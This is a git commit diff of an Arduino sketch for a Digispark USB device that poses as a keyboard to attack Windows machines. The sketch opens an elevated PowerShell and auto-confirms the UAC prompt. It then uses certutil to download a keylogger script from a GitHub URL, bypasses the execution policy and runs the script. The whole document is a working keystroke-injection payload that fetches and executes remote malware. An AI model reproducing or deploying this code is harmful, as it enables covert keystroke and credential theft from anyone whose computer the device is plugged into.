e0cf0820e0475a80aa31f3fe5e62e6a6491f4abb
chithu162 <59361657+chithu162@users.noreply.github.com>
2019-12-30 18:10:15 +0530

    Update digi_keylogger.ino

--- digi_keylogger.ino
+++ digi_keylogger.ino
@@ -1,27 +1,30 @@
 #include "DigiKeyboard.h"
-void setup() {
-}
-
-void loop() {
+void setup(){
+  
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -windowstyle hidden Start-Process powershell -Verb runAs");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(4000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print(" certutil -urlcache -split -f 'https://raw.githubusercontent.com/chithu162/final_project/master/keylogger.ps1'  $env:temp/script.ps1");
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("certutil -urlcache -split -f 'https://raw.githubusercontent.com/chithu162/final_project/master/keylogger.ps1'  $env:temp/script.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.print("Set-ExecutionPolicy Bypass");
+  DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  while (true) {
-  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
-  DigiKeyboard.delay(750);
-  DigiKeyboard.print("powershell.exe -windowstyle hidden -File $env:temp/script.ps1");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("A");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell.exe -File $env:temp/script.ps1;exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(30000);
-  }
 }
+void loop() {
+
+  }
